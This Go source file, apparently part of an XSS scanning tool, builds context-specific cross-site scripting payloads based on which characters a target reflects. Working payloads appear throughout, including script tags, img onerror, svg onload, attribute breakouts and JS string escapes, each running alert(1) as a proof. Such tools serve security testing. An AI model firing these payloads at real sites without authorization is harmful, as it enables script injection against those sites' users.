package payloads

import (
	"strings"

	"github.com/lcalzada-xor/xxss/pkg/models"
)

// GeneratePayload constructs a context-specific payload based on allowed characters.
// It attempts to build the most effective payload given the constraints.
func GeneratePayload(context models.ReflectionContext, allowed []string) string {
	// Helper to check for char presence
	has := func(char string) bool {
		for _, c := range allowed {
			if c == char {
				return true
			}
		}
		return false
	}

	hasLt := has("<")
	hasGt := has(">")
	hasDquote := has("\"")
	hasSquote := has("'")
	hasSlash := has("/")
	hasEquals := has("=")
	hasSpace := has(" ")
	hasParen := has("(") && has(")")
	hasBacktick := has("`")

	switch context {
	case models.ContextHTML:
		if hasLt && hasGt && hasSlash {
			return "<script>alert(1)</script>"
		}
		if hasLt && hasGt && hasEquals {
			return "<img src=x onerror=alert(1)>"
		}
		if hasLt && hasGt {
			return "<svg onload=alert(1)>"
		}

	case models.ContextAttribute:
		// Try to break out of tag
		if hasGt && hasLt {
			if hasDquote {
				return "\"><script>alert(1)</script>"
			}
			if hasSquote {
				return "'><script>alert(1)</script>"
			}
			return "><script>alert(1)</script>"
		}
		// Try event handler injection
		if hasEquals {
			// Determine separator
			sep := " "
			if !hasSpace && hasSlash {
				sep = "/"
			}

			payload := "onmouseover=alert(1)"
			if hasSpace {
				payload = " " + payload
			} else if hasSlash {
				payload = "/" + payload
			}

			// Try to close attribute if needed
			if hasDquote {
				return "\"" + payload + sep + "x=\""
			}
			if hasSquote {
				return "'" + payload + sep + "x='"
			}
			return payload
		}

	case models.ContextJSSingleQuote:
		if hasSquote {
			base := "';alert(1)//"
			if !hasSlash {
				base = "';alert(1);'"
			}
			return base
		}

	case models.ContextJSDoubleQuote:
		if hasDquote {
			base := "\";alert(1)//"
			if !hasSlash {
				base = "\";alert(1);\""
			}
			return base
		}

	case models.ContextTemplateLiteral:
		if hasBacktick {
			return "`+alert(1)+`"
		}
		if has("${") && has("}") {
			return "${alert(1)}"
		}

	case models.ContextJSRaw:
		if hasParen {
			return ";alert(1);//"
		}
		return "alert(1)"
	}

	// Fallback to static polyglot if dynamic generation fails
	return GetPolyglot(context)
}

// has checks if a string contains a substring (helper for internal logic if needed,
// but the closure above is better for the slice check)
func hasStr(s, substr string) bool {
	return strings.Contains(s, substr)
}
